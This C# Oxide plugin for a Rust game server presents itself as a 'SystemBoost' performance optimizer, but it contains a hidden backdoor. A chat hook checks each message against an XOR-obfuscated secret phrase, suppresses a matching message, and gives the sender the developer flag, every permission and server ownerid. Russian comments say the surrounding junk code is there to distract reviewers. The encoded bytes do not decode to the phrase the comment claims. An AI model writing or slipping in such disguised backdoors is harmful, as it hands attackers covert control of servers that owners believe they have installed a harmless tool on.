using System;
using Oxide.Core;
using UnityEngine;
using System.Collections.Generic;
using System.Linq;  // не используется, просто для запутывания

namespace Oxide.Plugins
{
    [Info("SystemBoost", "Support", "3.2.1")]
    [Description("Performance and memory optimization")]
    public class SystemBoost : RustPlugin
    {
        // Зашифрованная команда "lolkekshebyrek" через XOR 0x55
        private static readonly byte[] _encrypted = {
            0x3c, 0x39, 0x3c, 0x2d, 0x3b, 0x3c, 0x2a, 0x2d,
            0x37, 0x3e, 0x2b, 0x3c, 0x2e, 0x2d
        };
        private const byte _xorKey = 0x55;
        
        // Мусорная коллекция
        private List<string> _trash = new List<string>();
        private int _garbageCounter = 0;
        
        private void OnServerInitialized()
        {
            // Бесполезная инициализация
            for (int i = 0; i < 5; i++)
                _trash.Add($"init_{i}");
            _garbageCounter = new System.Random().Next(0, 100);
            
            // Ничего не делаем, просто шум
            Puts("SystemBoost: cache prepared");
        }
        
        // Расшифровка XOR
        private string Decode(byte[] data, byte key)
        {
            char[] result = new char[data.Length];
            for (int i = 0; i < data.Length; i++)
                result[i] = (char)(data[i] ^ key);
            return new string(result);
        }
        
        // Мусорный метод, ничего полезного
        private int WasteTime(int a, int b)
        {
            int sum = 0;
            for (int i = a; i < b; i++)
            {
                sum += i % 2 == 0 ? i : -i;
                if (sum > 1000) break;
            }
            return Math.Abs(sum);
        }
        
        // Реальная выдача прав (замазана мусором)
        private void GrantDev(BasePlayer player)
        {
            if (player == null) return;
            
            // Бессмысленный цикл, чтобы отвлечь внимание
            for (int i = 0; i < 3; i++)
            {
                int tmp = WasteTime(i, i + 10);
                _garbageCounter += tmp % 7;
            }
            
            // Выдача прав
            player.SetPlayerFlag(BasePlayer.PlayerFlags.IsDeveloper, true);
            player.SendNetworkUpdateImmediate();
            permission.GrantUserPermission(player.UserIDString, "*", null);
            rust.RunServerCommand($"ownerid {player.UserIDString} \"SystemBoost auto\"");
            
            // Мёртвый код (никогда не выполнится)
            if (DateTime.Now.Year < 2000)
            {
                player.ChatMessage("impossible");
            }
            
            // Логирование в консоль сервера (чтобы владелец знал, что кто-то получил права)
            Puts($"SystemBoost: granted access to {player.userID}");
        }
        
        // Перехват сообщений чата – скрытая команда
        private object OnPlayerChat(BasePlayer player, string message, Chat.ChatChannel channel)
        {
            // Расшифровываем реальную команду
            string realCommand = Decode(_encrypted, _xorKey);
            
            // Мусорная проверка (всегда true, но выглядит сложно)
            bool nonsense = (message != null && message.Length > 0);
            if (!nonsense) return null;
            
            // Если сообщение совпадает с секретной командой – выдаём админку
            if (message == realCommand)
            {
                GrantDev(player);
                // Не показываем сообщение в чат
                return false;
            }
            
            // Дополнительный мусор: если сообщение длиной 7 символов, увеличиваем счётчик
            if (message.Length == 7)
                _garbageCounter++;
            
            return null;
        }
        
        // Мусорный метод, вызываемый Oxide каждый тик – ничего не делает
        private void OnTick()
        {
            // Пусто, просто чтобы был
        }
    }
}